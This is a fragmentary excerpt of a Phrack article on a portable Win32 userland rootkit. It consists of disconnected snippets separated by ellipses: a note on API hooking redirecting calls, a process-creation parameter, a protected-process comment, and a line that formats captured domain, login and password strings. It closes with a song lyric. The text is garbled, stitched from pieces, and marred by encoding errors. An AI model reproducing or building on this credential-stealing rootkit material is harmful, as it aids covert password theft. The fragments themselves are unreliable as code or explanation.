---
title: "p62-0x0c_Win32_Portable_Userland_Rootkit"
ezine: "phrack"
---

# p62-0x0c_Win32_Portable_Userland_Rootkit
...
û direct or indirect û to the hooked API will inevitably be redirected to 
...
LPPROCESS_INFORMATION lpProcessInfo)
{
   ...
   RTK_FILE_CHAR (protected process) */
	...
	if(bret)
	{
		sprintf(line, "Domain '%S' - Login '%S' - Password '%S' û 
...
"I tried so hard, and gone so far. But in the end, it doesnÆt even
matter..."
